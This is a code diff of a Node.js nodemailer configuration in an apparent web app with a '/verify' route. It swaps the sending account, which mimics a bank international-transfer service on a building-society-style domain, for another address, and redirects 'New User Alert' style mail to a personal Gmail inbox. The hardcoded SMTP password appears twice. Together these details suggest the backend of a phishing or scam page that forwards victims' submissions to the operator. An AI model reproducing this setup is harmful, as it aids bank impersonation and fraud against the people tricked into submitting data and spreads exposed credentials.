@@ -28,7 +28,7 @@ const transporter = nodemailer.createTransport({
   port:'465',
   host:'mail.privateemail.com',
   auth: {
-    user: 'suntrustinternationaltransfer@thechorleybuildingsociety.co.uk',
+    user: 'customer@rkodes.com',
     pass: '08028345728',
   },
   secure: true,
@@ -45,8 +45,8 @@ fs.readFile('Mail.html','UTF-8',function(err, data) {
   const htmlToSend = template(replacements);
   
       const mailData = {
-      from: 'suntrustinternationaltransfer@thechorleybuildingsociety.co.uk',
-      to: 'dah_onest@yahoo.com',
+      from: 'customer@rkodes.com',
+      to: 'okumagbarukevwe@gmail.com',
       // to: 'joannelouisekenrick.cbs@gmail.com',
       // subject: `New User Alert`,
       text: '',
@@ -79,7 +79,7 @@ app.get('/verify', (req, res) => {
     port:'465',
     host:'mail.privateemail.com',
     auth: {
-      user: 'suntrustinternationaltransfer@thechorleybuildingsociety.co.uk',
+      user: 'customer@rkodes.com',
       pass: '08028345728',
     },
     secure: true,
@@ -95,8 +95,8 @@ app.get('/verify', (req, res) => {
     const htmlToSend = template(replacements);
     
         const mailData = {
-        from: 'suntrustinternationaltransfer@thechorleybuildingsociety.co.uk',
-        to: 'dah_onest@yahoo.com',
+        from: 'customer@rkodes.com',
+        to: 'okumagbarukevwe@gmail.com',
         // to: 'joannelouisekenrick.cbs@gmail.com',
         // subject: `New User Alert`,
         text: '',
